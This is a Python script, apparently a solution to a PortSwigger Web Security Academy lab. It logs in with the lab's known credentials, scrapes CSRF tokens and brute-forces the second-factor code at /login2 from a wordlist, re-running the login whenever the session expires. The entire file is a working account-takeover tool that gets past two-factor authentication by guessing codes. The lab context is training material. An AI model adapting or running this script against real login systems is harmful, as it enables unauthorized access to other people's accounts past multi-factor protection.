#this is the slow version of the tool , it help you understand what it happening ,it still work so... 
import requests
import re

url = 'https://0af800f703b3b41a803653b600cc0070.web-security-academy.net'  #change URL here

def run_macro(url, number):
    print(f'[*] running macro number {number}')
    

    session = requests.Session()
    
    # First request: GET /login
    print('sending GET /login')
    res1 = session.get(f"{url}/login")
    token_match = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"', res1.text)
    csrf_token = token_match.group(1)
    print(f'csrf token = {csrf_token}')
    
    # Second request: POST /login
    print('sending POST /login')
    res2 = session.post(
        url=f'{url}/login',
        data={
            'csrf': csrf_token,
            'username': 'carlos',
            'password': 'montoya'
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )
    print('Login successful')
    
    # Third request: GET /login2
    print('sending GET /login2')
    res3 = session.get(f'{url}/login2')
    token_match2 = re.search(r'name="csrf" value="([a-zA-Z0-9]+)"', res3.text)
    csrf_token2 = token_match2.group(1)
    print(f'csrf_token2 = {csrf_token2}')
    
    # Return the session object instead of just session cookie
    return csrf_token2, session

def bruteforce_2fa(url, code_list):
    num = 1
    
    # Get initial session and CSRF token
    csrf_token, session = run_macro(url, 0)   
    for guess in code_list:
        guess = guess.strip()
       
        print(f'[*] ......................TESTING : {guess} ...............................')
        
        res = session.post(
            url=f'{url}/login2',
            data={
                'csrf': csrf_token,
                'mfa-code': guess
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False
        )
        
        if res.status_code == 302:
            print("[+] Found Valid code :", guess)
            return
        elif 'Invalid CSRF token' in res.text or res.status_code == 400:
            print("[-] Session expired or invalid CSRF, running macro again...")
            csrf_token, session = run_macro(url, num)
            if not csrf_token or not session:
                print("[-] Failed to refresh session")
                return
            num += 1
            res = session.post(
                url=f'{url}/login2',
                data={
                    'csrf': csrf_token,
                    'mfa-code': guess
                },
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=False
            )
            if res.status_code == 302:
                print("[+] Found Valid code :", guess)
                print(f"[+] Redirected to: {res.headers.get('Location', 'unknown')}")
                return
        else:
            print(f"[-] Code {guess} failed with status {res.status_code}")
    
    print('[-] Code NOT FOUND....')

def main():
    print('[*] Starting .......')
    
    # Read the code list
    try:
        with open('list.txt', 'r') as f:   #list.txt 
            code_list = f.readlines()
    except FileNotFoundError:
        print("[-] list.txt file not found")
        return
    
    bruteforce_2fa(url, code_list)

if __name__ == '__main__':
    main()
